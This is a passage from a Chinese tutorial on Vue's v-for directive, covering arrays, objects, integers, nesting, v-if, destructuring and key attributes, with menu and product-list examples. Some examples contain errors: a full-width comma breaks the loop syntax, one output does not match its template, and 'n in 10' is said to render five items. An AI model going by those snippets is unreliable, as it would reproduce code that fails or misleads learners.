> 如果我们想要在`v-for`遍历数组时拿到数组中每一项的索引，可以采取以下写法

```html
<ul>
  <!-- 以下方式相当于对数组arr进行迭代，item为迭代项,index为每一项的索引-->
  <li v-for="(item，index) in arr">{{ item }}</li>
</ul>
```

> 以上代码，最终编译后结果如下：

```html
<ul>
  <li>0 - 人气TOP</li>
  <li>1 - 爆款套餐</li>
  <li>2 - 咖啡</li>
  <li>3 - 奶茶</li>
  <li>4 - 甜品小点</li>
</ul>
```

**用 `of` 作为分隔符来替代 `in`**

> 我们也可以把 `item in arr`中的`in`用`of`来代替，写成：`item of arr`，

```html
<li v-for="(item，index) of arr">{{ item }}</li>
```

### 2、v-for 遍历对象

`v-for`指令可以用来遍历一个对象的所有属性值，属性名，位置索引

- 只遍历对象的属性值

```html
<!--以下方式相当于遍历对象myObject, value为属性值, 名字可自定义-->
<li v-for="value in myObject">{{ value }}</li>
```

- 同时遍历对象的属性值和属性名

```html
<!--value为对象属性值，key为对象的属性名-->
<li v-for="(value,key) in myObject">{{ value }}</li>
```

- 同时遍历对象的属性值、属性名、位置索引

```html
<!--value为对象属性值，key为对象的属性名,index为位置索引-->
<li v-for="(value,key,index) in myObject">{{ value }}</li>
```

**代码演示**

```vue
<script>
export default {
  data() {
    return {
      usersInfo: {
        username: "清心",
        age: 33,
        sex: "女",
      },
    };
  },
};
</script>

<template>
  <h3>用户信息</h3>
  <div v-for="(value, key, index) in usersInfo">
    {{ index }}---{{ key }}---{{ value }}
  </div>
</template>
```

> 以上代码，最终编译后结果如下：

```html
<h3>用户信息</h3>
<div>0---username---清心</div>
<div>1---age---33</div>
<div>2---sex---女</div>
```

### 3、v-for 与 整数

`v-for` 可以直接接受一个整数值，如下：

```html
<div v-for="n in 10">{{ n }}</div>
```

以上代码相当于把`div`这个模板重复`5`次，最终渲染后效果如下：

```html
<div>1</div>
<div>2</div>
<div>3</div>
<div>4</div>
<div>5</div>
```

> **注意：** n 的初始值是从 1 开始，而非 0。

### 4、v-for 多层嵌套循环

`v-for`与 JS 中使用 for 循环一样，可以嵌套使用。

> 如下：

```vue
<script>
export default {
  data() {
    return {
      dataInfo: [
        [1, 2, 3],
        ["A", "B", "C"],
      ],
    };
  },
};
</script>

<template>
  <ul v-for="arr in dataInfo">
    <li v-for="item in arr">{{ item }}</li>
  </ul>
</template>
```

> 以上代码，最终编译后结果如下：

```html
<ul>
  <li>1</li>
  <li>2</li>
  <li>3</li>
</ul>
<ul>
  <li>A</li>
  <li>B</li>
  <li>C</li>
</ul>
```

### 5、v-for 与`<template>`

当需要使用`v-for`指令来渲染一个包含多个元素的块时，可以将多个元素包裹在`<template>`标签里。

> 最终`<template>`标签不会出现在最终编译后的结果中

```vue
<script>
export default {
  data() {
    return {
      usersInfo: [
        {
          title: "新闻标题一",
          desc: "新闻一的描述新闻一的描述新闻一的描述",
        },
        {
          title: "新闻标题二",
          desc: "新闻二的描述新闻二的描述新闻二的描述",
        },
        {
          title: "新闻标题三",
          desc: "新闻三的描述新闻三的描述新闻三的描述",
        },
      ],
    };
  },
};
</script>

<template>
  <template v-for="(item, index) in usersInfo" :key="index">
    <h3>{{ item.title }}</h3>
    <p>{{ item.desc }}</p>
  </template>
</template>
```

> 以上代码编译后的结果如下：

```html
<h3>新闻标题一</h3>
<p>新闻一的描述新闻一的描述新闻一的描述</p>
<h3>新闻标题二</h3>
<p>新闻二的描述新闻二的描述新闻二的描述</p>
<h3>新闻标题三</h3>
<p>新闻三的描述新闻三的描述新闻三的描述</p>
```

### 6、案例：v-for 渲染二级菜单

```vue
<script>
export default {
  data() {
    return {
      menuList: [
        {
          category_id: 1001,
          title: "人气TOP",
          children: ["生酪拿铁", "丝绒拿铁", "相思红豆拿铁"],
        },
        {
          category_id: 1002,
          title: "爆款套餐",
          children: ["2杯贴贴咖啡", "3杯醒醒咖啡", "2杯么么咖啡"],
        },
        {
          category_id: 1003,
          title: "咖啡",
          children: ["生酪拿铁", "生椰丝绒拿铁", "2杯么么咖啡"],
        },
        {
          category_id: 1004,
          title: "奶茶",
          children: ["小小生椰", "丝绒拿铁", "生椰咖啡"],
        },
        {
          category_id: 1005,
          title: "甜品小点",
          children: ["甜品小点", "甜品小点", "甜品小点"],
        },
      ],
    };
  },
};
</script>

<template>
  <div class="menu">
    <template v-for="(item, index) in menuList" :key="index">
      <h3>{{ item.title }}</h3>
      <ul>
        <li v-for="(child, index) in item.children" :key="index">
          {{ child }}
        </li>
      </ul>
    </template>
  </div>
</template>

<style>
.menu {
  width: 200px;
  padding: 20px;
  background-color: skyblue;
}
</style>
```

> 以上代码，最终编译后结果如下：

```html
<div class="menu">
  <h3>人气TOP</h3>
  <ul>
    <li>生酪拿铁</li>
    <li>丝绒拿铁</li>
    <li>相思红豆拿铁</li>
  </ul>
  <h3>爆款套餐</h3>
  <ul>
    <li>2杯贴贴咖啡</li>
    <li>3杯醒醒咖啡</li>
    <li>2杯么么咖啡</li>
  </ul>
  <h3>咖啡</h3>
  <ul>
    <li>生酪拿铁</li>
    <li>生椰丝绒拿铁</li>
    <li>2杯么么咖啡</li>
  </ul>
  <h3>奶茶</h3>
  <ul>
    <li>小小生椰</li>
    <li>丝绒拿铁</li>
    <li>生椰咖啡</li>
  </ul>
  <h3>甜品小点</h3>
  <ul>
    <li>甜品小点</li>
    <li>甜品小点</li>
    <li>甜品小点</li>
  </ul>
</div>
```

> 具体显示效果如下：

![image-20230428163634391](https://www.arryblog.com/assets/img/image-20230428163634391.1004b3ef.png)

### 7、v-for 与 v-if 结合

当一个元素节点上同时出现`v-if`与`v-for`时 ，`v-if`比`v-for`的优先级会更高。

这就意味着`v-if`的条件中无法访问到 `v-for` 作用域内定义的变量别名。

> 以下代码会抛出一个错误，因为在`v-if`中是不能使用`v-for`中的 `item`

```html
<div
  class="tr"
  v-for="(item, index) in productList"
  v-if="item.price > 100"
></div>
```

如果我们确实需要在`v-if`中访问到`v-for`中的变量，则可以在外新包装一层`<template>`标签，并将`v-for`移到`<template>`标签上。这样不但解决了这个问题，而且可读性也更高。

```html
<template v-for="(item, index) in productList">
  <div class="tr" v-if="item.price > 100"></div>
</template>
```

**代码演示**

> 进过筛选，只显示价格`>100`元的衣服信息。

```vue
<script>
export default {
  data() {
    return {
      productList: [
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
      ],
    };
  },
};
</script>

<template>
  <div class="table">
    <div class="tr">
      <div class="th">序号</div>
      <div class="th">名称</div>
      <div class="th">价格</div>
    </div>
    <template v-for="(item, index) in productList" :key="index">
      <div class="tr" v-if="item.price > 100">
        <div class="td">{{ index }}</div>
        <div class="td">{{ item.title }}</div>
        <div class="td">{{ item.price }}</div>
      </div>
    </template>
  </div>
</template>

<style>
.table {
  display: table;
  width: 800px;
}

.table .tr {
  display: table-row;
}

.table .tr .td,
.table .tr .th {
  display: table-cell;
  border: 1px solid #000;
  height: 30px;
  text-align: center;
  line-height: 30px;
}

.table .tr .th {
  background-color: skyblue;
}
</style>
```

> 最终编译后结果如下：

```html
<div class="table">
  <div class="tr">
    <div class="th">序号</div>
    <div class="th">名称</div>
    <div class="th">价格</div>
  </div>
  <!--v-if-->
  <div class="tr">
    <div class="td">1</div>
    <div class="td">鼎铜毛呢夹克男中年男士商务休闲</div>
    <div class="td">290</div>
  </div>
  <div class="tr">
    <div class="td">2</div>
    <div class="td">t恤男短袖中年拼色撞色半袖</div>
    <div class="td">190</div>
  </div>
</div>
```

> 最终展示效果如下：

![image-20230428175543856](data:image/png;base64,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)

注：

以上方式筛选出价格`>100`的衣服并显示，不是最合理的，后面会讲到计算属性的方式来实现。

### 8、v-for 与 解构赋值

`v-for`指令后的表达式中可以使用解构赋值。

> 如下：

```vue
<script>
export default {
  data() {
    return {
      productList: [
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
      ],
    };
  },
};
</script>

<template>
  <ul>
    <!--采用解构赋值，取出title与price-->
    <li v-for="({ title, price }, index) in productList" :key="index">
      {{ index }}: {{ title }} -- {{ price }}
    </li>
  </ul>
</template>
```

> 代码编译后结果如下：

```html
<ul>
  <li>0: 短袖T恤男夏季新款印花宽松休闲 -- 39</li>
  <li>1: 鼎铜毛呢夹克男中年男士商务休闲 -- 290</li>
  <li>2: t恤男短袖中年拼色撞色半袖 -- 190</li>
</ul>
```

### 9、key 属性

- 在利用`v-for`指令渲染元素列表示，官方推荐我们为每个元素添加一个特殊的`key`属性。
- 并且要求同一个父元素下的子元素的`key`属性的值是唯一的，重复的 key 将导致渲染异常
- `key`是一个特殊的属性，最终页面被渲染后，`key`不会出现在元素的身上
- `key`属性主要作为 Vue 的虚拟 DOM 算法提示，在比较新旧节点列表时用于识别 vnode。
  - 在没有`key`的情况下，Vue 将使用一种最小化元素移动的算法，并尽可能地就地更新/复用相同类型的元素。
  - 如果传了 key，则将根据 key 的变化顺序来重新排列元素，并且将始终移除/销毁 key 已经不存在的元素。

为了帮助我们更好的理解 key 属性的作用及注意事项，接下来我们通过以下案例来展开讲解。

> 我们希望在渲染好的列表前添加一项新的内容，并且要保证最终能正确渲染出如下效果。

![GIF2023-6-160-02-03](https://www.arryblog.com/assets/img/GIF2023-6-160-02-03.557cffe6.gif)

**代码示例**

```html
<script>
  export default {
    data() {
      return {
        menuList: [
          {
            category_id: 1001,
            title: "人气TOP",
          },
          {
            category_id: 1002,
            title: "爆款套餐",
          },
          {
            category_id: 1003,
            title: "甜品小点",
          },
        ],
      };
    },
    methods: {
      add() {
        this.menuList.unshift({
          category_id: 1004,
          title: "咖啡奶茶",
        });
      },
    },
  };
</script>

<template>
  <button @click.once="add">添加</button>
  <ul>
    <li v-for="(item, index) in menuList" :key="index">
      {{ index }} - {{ item.title }}
      <input type="text" />
    </li>
  </ul>
</template>
```

注：

以上代码在利用`v-for`指令生成列表时，`key`属性的值为每一项的索引，虽也是唯一的。

但是当我们在数组的前面插入一项时，原有数组中的每一项的索引都加 1 了，而新增的第一项的索引为 0，这样造成了在新旧虚拟 DOM 对比时，每一项`key`相同的`li`中的文本内容都不一样，都要重新更新。

> 最终终渲染效果如下：

![GIF2023-6-1523-50-32](https://www.arryblog.com/assets/img/GIF2023-6-1523-50-32.e3458067.gif)

最终渲染出来的效果，并不是我们想要的，注意观察右边的代码，我们发现在更新时，每一项`li`中的文字内容都发生了更新，但是`input`标签没有被更新。

原因在于新旧虚拟 DOM 在对比时，把`key`相同的每一项拿出来对比，发现对应`key`值相同的每一项`li`中的文字内容不一样而`input`标签是一样的，所以只对内容做了更新，并没有对`input`标签做更新，最后一项`li`中内容为全部新增。

**DOM 渲染的内部原理 l 图**

![image-20230615234715726](https://www.arryblog.com/assets/img/image-20230615234715726.d3d4e823.png)

所以在这种情况下（在中间或前面）插入新的内容时，我们不能拿元素的`index`索引来作为`key`属性的值，而应该选择唯一的`category_id`来作为`key`属性的值，这样不管在任何位置插入新的元素，都不会造成`key`值的变化。

> 修改`key`属性值为`category_id`

```html
<ul>
  <li v-for="(item, index) in menuList" :key="item.category_id">
    {{ index }} - {{ item.title }}
    <input type="text" />
  </li>
</ul>
```

> 最终渲染效果如下：

![GIF2023-6-160-29-28](https://www.arryblog.com/assets/img/GIF2023-6-160-29-28.1680fc30.gif)

观察右边代码区，我们发现每一项`li`中的文本内容也发生了更新，是因为渲染后，文本中对应的序号发生了变化，如果去掉序号，你会发现除了新增的第个`li`，其`li`中的内容都不会被更新

```html
<ul>
  <li v-for="(item, index) in menuList" :key="item.category_id">
    {{ item.title }}
    <input type="text" />
  </li>
</ul>
```

> 最终渲染效果如下：

![GIF2023-6-160-32-12](https://www.arryblog.com/assets/img/GIF2023-6-160-32-12.05d88147.gif)

> 以`category_id`作为`key`属性的值，内部新旧虚拟 DOM 对比如下图

![image-20230616002308766](https://www.arryblog.com/assets/img/image-20230616002308766.28f74d0c.png)

总结

在利用`v-for`渲染列表时，添加`key`属性有利于提高后期渲染的速度，因为在后期渲染时，针对相同`key`的元素，如果内容没有变化则不会重新渲染而是复用之前的 DOM。

> 不过在使用`key`属性时，有两点要注意：

- 属于同一父元素下的子元素的`key`必需是唯一的
